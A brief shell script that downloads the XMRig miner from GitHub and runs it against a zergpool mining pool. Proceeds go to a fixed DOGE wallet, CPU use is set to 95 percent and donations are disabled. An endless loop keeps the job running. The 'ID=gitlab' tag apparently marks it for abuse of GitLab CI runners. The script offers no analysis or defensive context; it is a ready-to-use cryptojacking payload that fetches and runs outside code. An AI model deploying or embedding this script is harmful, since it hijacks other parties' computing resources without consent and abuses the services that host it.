#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar xf xmrig-6.12.1-linux-x64.tar.gz
./xmrig -a rx/0 -o stratum+tcp://randomx.na.mine.zergpool.com:4453 -u DFkNQGLsvqAxiX3JJgMJK5FyBZD36z5zfW --keepalive --max-cpu-usage 95 --timeout 120 --donate-level 0 -p c=DOGE,ID=gitlab
while [ 1 ]; do
sleep 3
done
sleep 999
